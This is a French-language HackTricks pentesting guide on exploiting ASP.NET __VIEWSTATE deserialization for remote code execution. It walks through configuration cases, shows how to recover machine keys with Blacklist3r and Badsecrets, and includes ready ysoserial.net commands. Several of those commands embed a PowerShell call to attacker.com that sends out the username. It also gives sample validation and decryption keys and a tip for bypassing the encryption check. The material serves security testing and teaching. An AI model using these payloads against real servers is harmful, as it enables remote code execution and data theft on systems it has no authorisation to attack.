# Exploiter \_\_VIEWSTATE sans conna√Ætre les secrets

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Astuce bug bounty** : **inscrivez-vous** sur **Intigriti**, une **plateforme de bug bounty premium cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## Qu'est-ce que ViewState

**ViewState** sert de m√©canisme par d√©faut dans ASP.NET pour maintenir les donn√©es de page et de contr√¥le √† travers les pages web. Lors du rendu du HTML d'une page, l'√©tat actuel de la page et les valeurs √† pr√©server lors d'un postback sont s√©rialis√©s en cha√Ænes encod√©es en base64. Ces cha√Ænes sont ensuite plac√©es dans des champs ViewState cach√©s.

Les informations de ViewState peuvent √™tre caract√©ris√©es par les propri√©t√©s suivantes ou leurs combinaisons :

* **Base64** :
* Ce format est utilis√© lorsque les attributs `EnableViewStateMac` et `ViewStateEncryptionMode` sont tous deux d√©finis sur false.
* **Base64 + MAC (Message Authentication Code) Activ√©** :
* L'activation de MAC est r√©alis√©e en d√©finissant l'attribut `EnableViewStateMac` sur true. Cela fournit une v√©rification d'int√©grit√© pour les donn√©es de ViewState.
* **Base64 + Chiffr√©** :
* Le chiffrement est appliqu√© lorsque l'attribut `ViewStateEncryptionMode` est d√©fini sur true, garantissant la confidentialit√© des donn√©es de ViewState.

## Cas de test

L'image est un tableau d√©taillant diff√©rentes configurations pour ViewState dans ASP.NET en fonction de la version du framework .NET. Voici un r√©sum√© du contenu :

1. Pour **toute version de .NET**, lorsque MAC et Chiffrement sont d√©sactiv√©s, une MachineKey n'est pas requise, et donc il n'y a pas de m√©thode applicable pour l'identifier.
2. Pour **les versions inf√©rieures √† 4.5**, si MAC est activ√© mais que le Chiffrement ne l'est pas, une MachineKey est requise. La m√©thode pour identifier la MachineKey est appel√©e "Blacklist3r."
3. Pour **les versions inf√©rieures √† 4.5**, que MAC soit activ√© ou d√©sactiv√©, si le Chiffrement est activ√©, une MachineKey est n√©cessaire. Identifier la MachineKey est une t√¢che pour "Blacklist3r - Future Development."
4. Pour **les versions 4.5 et sup√©rieures**, toutes les combinaisons de MAC et de Chiffrement (que les deux soient vrais, ou que l'un soit vrai et l'autre faux) n√©cessitent une MachineKey. La MachineKey peut √™tre identifi√©e en utilisant "Blacklist3r."

### Cas de test : 1 ‚Äì EnableViewStateMac=false et viewStateEncryptionMode=false

Il est √©galement possible de d√©sactiver compl√®tement le ViewStateMAC en d√©finissant la cl√© de registre `AspNetEnforceViewStateMac` sur z√©ro dans :
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identification des attributs ViewState**

Vous pouvez essayer d'identifier si ViewState est prot√©g√© par MAC en capturant une requ√™te contenant ce param√®tre avec BurpSuite. Si Mac n'est pas utilis√© pour prot√©ger le param√®tre, vous pouvez l'exploiter en utilisant [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 ‚Äì Comme le cas de test 1 mais le cookie ViewState n'est pas envoy√© par le serveur

Les d√©veloppeurs peuvent **supprimer ViewState** de devenir une partie d'une requ√™te HTTP (l'utilisateur ne recevra pas ce cookie).\
On peut supposer que si **ViewState** est **absent**, leur impl√©mentation est **s√©curis√©e** contre toute vuln√©rabilit√© potentielle li√©e √† la d√©s√©rialisation de ViewState.\
Cependant, ce n'est pas le cas. Si nous **ajoutons le param√®tre ViewState** au corps de la requ√™te et envoyons notre charge utile s√©rialis√©e cr√©√©e √† l'aide de ysoserial, nous serons toujours en mesure d'atteindre **l'ex√©cution de code** comme montr√© dans **le cas 1**.

### Test Case: 2 ‚Äì .Net < 4.5 et EnableViewStateMac=true & ViewStateEncryptionMode=false

Pour **activer ViewState MAC** pour une **page sp√©cifique**, nous devons apporter les modifications suivantes √† un fichier aspx sp√©cifique :
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Nous pouvons √©galement le faire pour l'application **globale** en le d√©finissant dans le fichier **web.config** comme indiqu√© ci-dessous :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Comme le param√®tre est prot√©g√© par un MAC, cette fois, pour ex√©cuter l'attaque avec succ√®s, nous avons d'abord besoin de la cl√© utilis√©e.

Vous pouvez essayer d'utiliser [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) pour trouver la cl√© utilis√©e.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) est un autre outil qui peut identifier des machineKeys connus. Il est √©crit en Python, donc contrairement √† Blacklist3r, il n'y a pas de d√©pendance Windows. Pour les viewstates .NET, il existe un utilitaire "python blacklist3r", qui est le moyen le plus rapide de l'utiliser.

Il peut √™tre fourni avec le viewstate et le g√©n√©rateur directement :
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Ou, il peut se connecter directement √† l'URL cible et essayer d'extraire le viewstate du HTML :
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Pour rechercher des viewstates vuln√©rables √† grande √©chelle, en conjonction avec l'√©num√©ration de sous-domaines, le module `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) peut √™tre utilis√© :
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Si vous avez de la chance et que la cl√© est trouv√©e, vous pouvez proc√©der √† l'attaque en utilisant [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
Dans les cas o√π le param√®tre `_VIEWSTATEGENERATOR` **n'est pas envoy√©** par le serveur, vous **n'avez pas** besoin de **fournir** le param√®tre `--generator` **mais ceux-ci** :
```bash
--apppath="/" --path="/hello.aspx"
```
### Cas de test : 3 ‚Äì .Net < 4.5 et EnableViewStateMac=true/false et ViewStateEncryptionMode=true

Dans ce cas, il n'est pas connu si le param√®tre est prot√©g√© par MAC. Alors, la valeur est probablement chiffr√©e et vous **aurez besoin de la cl√© machine pour chiffrer votre charge utile** afin d'exploiter la vuln√©rabilit√©.

**Dans ce cas, le** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **module est en cours de d√©veloppement...**

**Avant .NET 4.5**, ASP.NET peut **accepter** un param√®tre \_`__VIEWSTATE`\_ **non chiffr√©** de la part des utilisateurs **m√™me** si **`ViewStateEncryptionMode`** a √©t√© d√©fini sur _**Always**_. ASP.NET **v√©rifie uniquement** la **pr√©sence** du param√®tre **`__VIEWSTATEENCRYPTED`** dans la requ√™te. **Si l'on supprime ce param√®tre et envoie la charge utile non chiffr√©e, elle sera toujours trait√©e.**

Par cons√©quent, si les attaquants trouvent un moyen d'obtenir la cl√© machine via une autre vuln√©rabilit√© comme le parcours de fichiers, la commande [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) utilis√©e dans le **Cas 2** peut √™tre utilis√©e pour effectuer un RCE en utilisant la vuln√©rabilit√© de d√©s√©rialisation de ViewState.

* Supprimez le param√®tre `__VIEWSTATEENCRYPTED` de la requ√™te afin d'exploiter la vuln√©rabilit√© de d√©s√©rialisation de ViewState, sinon cela renverra une erreur de validation MAC de ViewState et l'exploitation √©chouera.

### Cas de test : 4 ‚Äì .Net >= 4.5 et EnableViewStateMac=true/false et ViewStateEncryptionMode=true/false sauf les deux attributs √† false

Nous pouvons forcer l'utilisation du framework ASP.NET en sp√©cifiant le param√®tre ci-dessous dans le fichier web.config comme indiqu√© ci-dessous.
```xml
<httpRuntime targetFramework="4.5" />
```
Alternativement, cela peut √™tre fait en sp√©cifiant l'option ci-dessous √† l'int√©rieur du param√®tre `machineKey` du fichier web.config.
```bash
compatibilityMode="Framework45"
```
Comme dans le pr√©c√©dent, la **valeur est chiffr√©e.** Ensuite, pour envoyer une **charge utile valide, l'attaquant a besoin de la cl√©**.

Vous pouvez essayer d'utiliser [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) pour trouver la cl√© utilis√©e :
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Pour une description plus d√©taill√©e de IISDirPath et TargetPagePath [r√©f√©rez-vous ici](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Ou, avec [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (avec une valeur de g√©n√©rateur) :
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Une fois qu'une cl√© de machine valide est identifi√©e, **l'√©tape suivante consiste √† g√©n√©rer une charge utile s√©rialis√©e en utilisant** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Si vous avez la valeur de `__VIEWSTATEGENERATOR`, vous pouvez essayer d'**utiliser** le param√®tre `--generator` avec cette valeur et **omettre** les param√®tres `--path` et `--apppath`.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

Une exploitation r√©ussie de la vuln√©rabilit√© de d√©s√©rialisation ViewState entra√Ænera une requ√™te hors bande vers un serveur contr√¥l√© par l'attaquant, qui inclut le nom d'utilisateur. Ce type d'exploit est d√©montr√© dans une preuve de concept (PoC) qui peut √™tre trouv√©e √† travers une ressource intitul√©e "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". Pour plus de d√©tails sur le fonctionnement du processus d'exploitation et comment utiliser des outils comme Blacklist3r pour identifier le MachineKey, vous pouvez consulter la [PoC d'Exploitation R√©ussie](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).

### Cas de Test 6 ‚Äì ViewStateUserKeys est utilis√©

La propri√©t√© **ViewStateUserKey** peut √™tre utilis√©e pour **d√©fendre** contre une **attaque CSRF**. Si une telle cl√© a √©t√© d√©finie dans l'application et que nous essayons de g√©n√©rer la charge utile **ViewState** avec les m√©thodes discut√©es jusqu'√† pr√©sent, la **charge utile ne sera pas trait√©e par l'application**.\
Vous devez utiliser un param√®tre de plus pour cr√©er correctement la charge utile :
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### R√©sultat d'une exploitation r√©ussie <a href="#poc" id="poc"></a>

Pour tous les cas de test, si le payload ViewState YSoSerial.Net fonctionne **avec succ√®s**, alors le serveur r√©pond avec ‚Äú**500 Internal server error**‚Äù ayant le contenu de la r√©ponse ‚Äú**L'information d'√©tat est invalide pour cette page et pourrait √™tre corrompue**‚Äù et nous obtenons la requ√™te OOB.

V√©rifiez [plus d'informations ici](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/\[\*\*https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\*\*]\(https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\)/README.md)

## R√©f√©rences

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Astuce bug bounty** : **inscrivez-vous** sur **Intigriti**, une plateforme de **bug bounty premium cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des r√©compenses allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
